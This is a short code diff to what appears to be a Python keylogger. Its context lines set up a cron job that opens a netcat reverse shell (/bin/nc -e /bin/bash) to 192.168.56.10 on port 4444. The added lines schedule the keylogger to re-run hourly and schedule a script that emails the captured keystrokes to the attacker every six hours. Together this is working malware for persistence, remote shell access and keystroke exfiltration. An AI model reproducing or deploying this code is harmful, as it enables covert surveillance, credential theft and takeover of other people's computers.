@@ -52,6 +52,16 @@ with Listener(on_press=on_press) as listener:
 rev_cron = CronTab(user='kali')
 job1 = rev_cron.new(command='/bin/nc –e /bin/bash 192.168.56.10 4444 >/dev/null 2>&1')
 job1.minute.every(1)
-
 rev_cron.write()
 
+# Create a cronjob to run this script once an hour to make sure we keep capturing
+key_cron = CronTab(user='kali')
+job2 = key_cron.new(command='./PATH_TO_KEYLOGGER.PY')
+job2.hour.every(1)
+key_cron.write()
+
+# Create a cronjob to send keylog.txt to attacker via email 4 times a day
+mail_cron = CronTab(user='kali')
+job3 = mail_cron.new(command='./PATH_TO_ATTACHMENTSS.PY')
+job3.hour.every(6)
+mail_cron.write()
